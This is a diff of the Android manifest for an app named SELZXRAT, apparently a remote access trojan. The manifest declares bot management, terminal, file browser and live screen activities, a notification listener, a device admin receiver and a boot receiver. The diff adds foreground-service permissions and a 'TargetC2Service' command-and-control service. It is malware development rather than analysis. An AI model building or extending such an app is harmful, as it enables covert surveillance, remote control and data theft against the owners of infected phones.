@@ -9,6 +9,9 @@
         android:maxSdkVersion="28" />
     <uses-permission android:name="android.permission.BIND_ACCESSIBILITY_SERVICE"
         tools:ignore="InvalidPermissions" />
+    
+    <uses-permission android:name="android.permission.FOREGROUND_SERVICE" />
+    <uses-permission android:name="android.permission.FOREGROUND_SERVICE_DATA_SYNC" />
 
     <application
         android:name=".SELZXRATApp"
@@ -22,7 +25,6 @@
         android:networkSecurityConfig="@xml/network_security_config"
         tools:targetApi="34">
 
-        <!-- Main Activity -->
         <activity
             android:name=".ui.MainActivity"
             android:exported="true"
@@ -33,43 +35,35 @@
             </intent-filter>
         </activity>
 
-        <!-- Splash Activity -->
         <activity
             android:name=".ui.SplashActivity"
             android:exported="false"
             android:theme="@style/Theme.SELZXRAT.Splash" />
 
-        <!-- Settings Activity -->
         <activity
             android:name=".ui.SettingsActivity"
             android:exported="false" />
 
-        <!-- About Activity -->
         <activity
             android:name=".ui.AboutActivity"
             android:exported="false" />
 
-        <!-- Bot Detail Activity -->
         <activity
             android:name=".ui.BotDetailActivity"
             android:exported="false" />
 
-        <!-- Terminal Activity -->
         <activity
             android:name=".ui.TerminalActivity"
             android:exported="false" />
 
-        <!-- File Browser Activity -->
         <activity
             android:name=".ui.FileBrowserActivity"
             android:exported="false" />
 
-        <!-- Live Screen Activity -->
         <activity
             android:name=".ui.LiveScreenActivity"
             android:exported="false" />
 
-        <!-- Notification Listener Service -->
         <service
             android:name=".services.NotificationListener"
             android:exported="true"
@@ -79,7 +73,12 @@
             </intent-filter>
         </service>
 
-        <!-- Firebase Messaging Service -->
+        <service
+            android:name=".services.TargetC2Service"
+            android:enabled="true"
+            android:exported="false"
+            android:foregroundServiceType="dataSync" />
+
         <service
             android:name=".services.SELZXFCMService"
             android:exported="false">
@@ -88,13 +87,11 @@
             </intent-filter>
         </service>
 
-        <!-- Job Service for background tasks -->
         <service
             android:name=".services.SELZXJobService"
             android:exported="false"
             android:permission="android.permission.BIND_JOB_SERVICE" />
 
-        <!-- Device Admin Receiver -->
         <receiver
             android:name=".services.DeviceAdminReceiver"
             android:exported="true"
@@ -105,11 +102,10 @@
             <intent-filter>
                 <action android:name="android.app.action.DEVICE_ADMIN_ENABLED" />
                 <action android:name="android.app.action.DEVICE_ADMIN_DISABLED" />
-            |<action android:name="android.app.action.DEVICE_ADMIN_ENABLE_REQUESTED" />
+                <action android:name="android.app.action.DEVICE_ADMIN_ENABLE_REQUESTED" />
             </intent-filter>
         </receiver>
 
-        <!-- Boot Receiver -->
         <receiver
             android:name=".services.BootReceiver"
             android:exported="true">
